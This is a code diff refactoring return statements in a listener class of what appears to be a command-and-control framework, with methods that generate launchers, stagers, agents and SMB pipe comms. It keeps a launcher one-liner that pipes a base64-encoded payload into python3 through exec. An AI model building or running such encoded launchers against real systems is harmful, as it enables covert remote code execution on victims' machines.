@@ -217,14 +217,15 @@ class Listener:
                     launchEncoded = base64.b64encode(
                         launcherBase.encode("UTF-8")
                     ).decode("UTF-8")
-                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
-                    return launcher
+                    return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
                 else:
                     return launcherBase
             else:
                 log.error(
                     "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
                 )
+                return None
+        return None
 
     def generate_stager(
         self,
@@ -263,6 +264,7 @@ class Listener:
             log.error(
                 "Invalid language specification, only 'ironpython' is current supported for this module."
             )
+            return None
 
         elif language.lower() == "python":
             template_path = [
@@ -306,6 +308,7 @@ class Listener:
             log.error(
                 "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
+            return None
 
     def generate_agent(
         self,
@@ -336,6 +339,7 @@ class Listener:
             log.error(
                 "Invalid language specification, only 'ironpython' is current supported for this module."
             )
+            return None
 
         elif language == "python":
             with open(
@@ -368,6 +372,7 @@ class Listener:
             log.error(
                 "Invalid language specification, only 'ironpython' is current supported for this module."
             )
+            return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -387,6 +392,7 @@ class Listener:
                 log.error(
                     "Invalid language specification, only 'ironpython' is current supported for this module."
                 )
+                return None
 
             elif language.lower() == "python":
                 template_path = [
@@ -401,15 +407,16 @@ class Listener:
                     "pipe_name": pipe_name,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             else:
                 log.error(
                     "Invalid language specification, only 'ironpython' is current supported for this module."
                 )
+                return None
         else:
             log.error("generate_comms(): no language specified!")
+            return None
 
     def start(self):
         """
@@ -427,7 +434,7 @@ class Listener:
                 )
 
                 if not agent:
-                    return
+                    return None
 
                 self.mainMenu.agenttasksv2.create_task_smb(
                     db, agent, name + "|" + self.options["PipeName"]["Value"]
